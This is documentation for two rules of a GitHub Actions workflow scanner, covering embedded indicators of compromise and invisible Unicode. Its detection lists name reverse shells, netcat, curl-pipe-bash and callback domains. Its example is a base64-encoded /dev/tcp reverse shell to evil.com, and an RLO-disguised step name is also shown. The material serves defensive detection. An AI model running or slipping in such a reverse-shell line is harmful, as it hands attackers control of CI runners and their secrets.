# Steganography Rules (600s)

Steganographic techniques can be used to hide malicious payloads or exfiltration channels inside GitHub Actions workflow files. These rules detect invisible Unicode characters and indicators of compromise.

---

## WRD-602: Workflow Embedded IOC

**Severity:** Critical

**What it detects:** Suspicious patterns in workflow YAML that indicate malicious activity. Detected patterns include:

- `eval` combined with `base64` encoding
- `base64 -d` / `base64 --decode` operations
- Netcat listeners (`nc -l`, `ncat -l`)
- Bash `/dev/tcp/` reverse shells
- Named pipe + netcat (`mkfifo` + `nc`)
- Python one-liners with socket/subprocess
- `curl | bash` and `wget | sh` patterns
- Tunneling services (ngrok, localtunnel, serveo, bore.pub)
- Known paste/file sharing services (pastebin.com, transfer.sh)
- Known C2/callback domains (burpcollaborator.net, interact.sh, oastify.com)
- Download-and-execute (`chmod +x` + `./`)

**Vulnerable:**

```yaml
- run: echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS80NDQ0IDA+JjE=" | base64 -d | bash
```

The decoded value is `bash -i >& /dev/tcp/evil.com/4444 0>&1` (a reverse shell).

**Remediation:** Remove the suspicious pattern immediately. Audit any secrets or tokens that may have been exposed in previous runs. Never decode and execute base64 strings at runtime in workflows.

---

## WRD-621: Suspicious Invisible Unicode

**Severity:** Medium

**What it detects:** Invisible Unicode characters embedded in workflow YAML files. These can hide malicious commands, alter string comparisons, or use bidirectional text overrides to disguise code. Detected characters include:

- U+200B (Zero Width Space)
- U+200C/D (Zero Width Non-Joiner/Joiner)
- U+200E/F (Left-to-Right / Right-to-Left Mark)
- U+202A-202E (Bidi Embedding/Override characters)
- U+2060-2064 (Invisible operators)
- U+FEFF (BOM / Zero Width No-Break Space) -- except at file start
- U+00AD (Soft Hyphen)
- U+034F (Combining Grapheme Joiner)
- U+061C (Arabic Letter Mark)
- U+2066-2069 (Bidi Isolate characters)
- U+FE00 (Variation Selector)
- U+180E (Mongolian Vowel Separator)

**Vulnerable:**

```yaml
# A step name containing RLO character to disguise what follows
- name: Build‮hs.suoicilam
  run: malicious.sh
```

**Remediation:** Enforce a CI check that rejects workflow files containing non-ASCII invisible characters. Use `warden scan` or a linter in a pre-commit hook. A BOM at position 0 is allowed.
